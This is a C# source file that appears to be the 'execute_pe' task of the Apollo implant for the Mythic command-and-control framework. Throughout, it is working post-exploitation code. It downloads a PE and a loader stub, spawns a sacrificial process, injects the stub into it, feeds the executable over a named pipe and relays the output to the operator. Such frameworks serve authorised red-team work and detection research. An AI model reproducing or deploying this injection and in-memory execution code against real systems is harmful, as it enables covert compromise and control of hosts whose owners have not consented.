#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_PE
#endif

#if EXECUTE_PE

using System;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Utils;
using System.Runtime.InteropServices;
using System.ComponentModel;

namespace Tasks
{
    public class execute_pe : Tasking
    {

#pragma warning disable 0649
        [DataContract]
        internal struct ExecutePEParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "pe_name")]
            public string PEName;
            [DataMember(Name = "commandline")]
            public string CommandLine;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pe_id")]
            public string PeId;
        }
#pragma warning restore 0649

        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _sendAction;
        private Action<object> _flushMessages;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
        private bool _completed = false;
        public execute_pe(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _sendAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _senderEvent,
                    _cancellationToken.Token.WaitHandle
                    });
                    if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                }
                ps.Close();
                _complete.Set();
            };

            _flushMessages = (object p) =>
            {
                string output = "";
                while (!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _complete,
                        _cancellationToken.Token.WaitHandle
                    }, 1000);
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false
                            ));
                    }
                }
                output = string.Join("", _assemblyOutput.Flush());
                if (!string.IsNullOrEmpty(output))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            output,
                            false
                        ));
                }
            };
        }

        public override void Kill()
        {
            _completed = true;
            _cancellationToken.Cancel();
            _complete.Set();
        }


        public override void Start()
        {
            MythicTaskResponse? resp = null;
            Process? proc = null;
            try
            {
                DebugHelp.DebugWriteLine("Starting execute_pe task");
                DebugHelp.DebugWriteLine($"Task Parameters: {_data.Parameters}");
                ExecutePEParameters parameters = _jsonSerializer.Deserialize<ExecutePEParameters>(_data.Parameters);

                DebugHelp.DebugWriteLine($"Executable name: {parameters.PEName}");
                DebugHelp.DebugWriteLine($"Process command line: {parameters.CommandLine}");

                if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                {
                    throw new ArgumentNullException($"One or more required arguments was not provided.");
                }

                byte[] peBytes = [0];

                if (!string.IsNullOrEmpty(parameters.PeId))
                {
                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.PeId, out peBytes))
                        {
                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
                        }
                    }
                }
                else
                {
                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
                }

                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
                if (peBytes.Length == 0)
                {
                    throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
                }

                var ret = _agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic);
                if (!ret)
                {
                    throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
                }

                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(true);

                proc = _agent.GetProcessManager()
                    .NewProcess(
                        info.Application,
                        info.Arguments,
                        true
                    ) ?? throw new InvalidOperationException($"Process manager failed to create a new process {info.Application}");

                if (!proc.Start())
                {
                    throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessCreate((int) proc.PID, info.Application, info.Arguments)
                        ]
                    )
                );

                if (!proc.Inject(exePEPic))
                {
                    throw new InvalidOperationException($"Failed to inject assembly loader into sacrificial process.");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessInject((int) proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
                        ]
                    )
                );

                var cmdargs = new ExecutePEIPCMessage()
                {
                    Executable = peBytes,
                    ImageName = parameters.PEName,
                    CommandLine = parameters.CommandLine,
                };

                var client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);

                client.ConnectionEstablished += Client_ConnectionEstablished;
                client.MessageReceived += Client_MessageReceived;
                client.Disconnect += Client_Disconnect;

                if (!client.Connect(10000))
                {
                    throw new InvalidOperationException($"Failed to connect to named pipe.");
                }

                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                foreach (IPCChunkedData chunk in chunks)
                {
                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                }

                _senderEvent.Set();
                WaitHandle.WaitAny(
                [
                    _complete,
                    _cancellationToken.Token.WaitHandle
                ]);
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
            }

            var taskResponse = resp ??= CreateTaskResponse("", true, "completed");

            if (proc is Process procHandle)
            {
                if (!procHandle.HasExited)
                {
                    proc.Kill();
                    taskResponse.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(taskResponse);
        }

        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _completed = true;
            _cancellationToken.Cancel();
            _complete.Set();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                pipe.EndWrite(result);
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private void Client_MessageReceived(object sender, NamedPipeMessageArgs e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            _assemblyOutput.Add(msg);
        }
    }
}
#endif
